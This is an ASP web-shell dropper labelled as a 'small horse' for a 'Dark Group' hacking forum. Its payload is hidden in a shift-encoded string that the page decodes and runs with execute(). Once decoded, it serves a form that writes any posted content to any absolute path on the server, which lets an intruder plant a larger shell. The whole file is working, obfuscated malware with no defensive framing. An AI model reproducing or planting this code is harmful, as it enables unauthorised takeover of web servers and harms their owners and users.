<%
darkst="!黎!ejn!pckGTP!黎!ejn!gebub!黎!ejn!pckDpvouGjmf!黎!po!fssps!sftvnf!ofyu!黎!Tfu!pckGTP!>!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!黎!jg!Usjn)sfrvftu)#tztufnqbui#**=?##!uifo!黎!gebub!>!sfrvftu)#tBwfebub#*!黎!Tfu!pckDpvouGjmf>pckGTP/DsfbufUfyuGjmf)sfrvftu)#tztufnqbui#*-Usvf*!黎!pckDpvouGjmf/Xsjuf!gebub!黎!jg!fss!>1!uifo!黎!sftqpotf/xsjuf!#=gpou!dpmps>sfe?保存成功""=0gpou?#!黎!fmtf!黎!sftqpotf/xsjuf!#=gpou!dpmps>sfe?保存失败""=0gpou?#!黎!foe!jg!黎!fss/dmfbs!黎!foe!jg!黎!pckDpvouGjmf/Dmptf!黎!Tfu!pckDpvouGjmf>Opuijoh!黎!Tfu!pckGTP!>!Opuijoh!黎!Sftqpotf/xsjuf!#=ujumf?暗组技术论坛专用小马!!Cz;Ofx5=0Ujumf?#黎!Sftqpotf/xsjuf!#=gpsn!bdujpo>((!nfuipe>qptu?#!黎!Sftqpotf/xsjuf!#保存文件的=gpou!dpmps>sfe?绝对路径)包括文件名;如E;]xfc]y/btq*;=0gpou?#!黎!Sftqpotf/Xsjuf!#=joqvu!uzqf>ufyu!obnf>tztufnqbui!xjeui>43!tj{f>61?#!黎!Sftqpotf/Xsjuf!#=cs?#!黎!Sftqpotf/xsjuf!#本文件绝对路径#!黎!Sftqpotf/xsjuf!tfswfs/nbqqbui)Sfrvftu/TfswfsWbsjbcmft)#TDSJQU`OBNF#**!黎!Sftqpotf/xsjuf!#=cs?#!黎!Sftqpotf/xsjuf!#输入马的内容;#!黎!Sftqpotf/xsjuf!#=ufyubsfb!obnf>tBwfebub!dpmt>91!spxt>21!xjeui>43?=0ufyubsfb?#!黎!Sftqpotf/xsjuf!#=joqvu!uzqf>tvcnju!wbmvf>保存?#!黎!Sftqpotf/xsjuf!#=0gpsn?#!黎"
execute(UnEncode(darkst))
function UnEncode(temp)
but=1
for i = 1 to len(temp)
if mid(temp,i,1)<>"黎" then
If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(temp, i, 1)))
else
pk=asc(mid(temp,i,1))-but
if pk>126 then
pk=pk-95
elseif pk<32 then
pk=pk+95
end if
a=a&chr(pk)
end if
else
a=a&vbcrlf
end if
next
UnEncode=a
end function
%>